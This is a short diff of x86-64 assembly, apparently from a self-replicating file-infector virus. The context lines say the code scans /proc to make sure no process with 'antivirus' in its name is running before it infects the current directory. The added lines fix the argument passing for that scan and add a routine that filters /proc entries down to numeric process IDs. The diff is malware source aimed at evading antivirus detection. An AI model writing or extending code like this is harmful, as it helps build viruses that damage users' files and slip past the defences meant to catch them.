@@ -14,6 +14,7 @@ _start:
 	;First we wanna check that no program containning "antivirus" in it's name is running"
 	mov rax, 0x00636f72702f; /proc
 	push rax
+	lea rdi, [rsp]
 	call check_process
 	add rsp, 8
 	;infect current directory
@@ -174,6 +175,9 @@ check_process:
 			cmp byte[r9 + 18], DIRECTORY_FILE; [r9 +18] is file type
 			jne cp_skip_file
 			mov rdi, rsi; pass fname as arg
+			call check_num_name
+			cmp rax, 0
+			jne cp_skip_file
 			;do stuff here
 			cp_skip_file: 
 			mov rsi, r8
@@ -188,6 +192,28 @@ check_process:
 	cp_dir_read_exit:
 	add rsp, 4
 	add rsp,1024
+retn
+;int check_num_name(char *) check if string only contains digits
+; returns 1 if name does contain something else than digits or 0 if there's only digits
+check_num_name:
+	push rcx
+
+	xor rcx, rcx
+	xor rax, rax
+	loop_cnn:
+		cmp byte[rdi + rcx], 0
+		je loop_cnn_exit
+		cmp byte[rdi + rcx], 0x30
+		jb loop_cnn_bad_exit
+		cmp byte[rdi + rcx], 0x39
+		ja loop_cnn_bad_exit
+		inc rcx
+		jmp loop_cnn
+	loop_cnn_bad_exit:
+	mov rax, 1
+	loop_cnn_exit:
+
+	pop rcx
 retn
 
 ft_strlen:
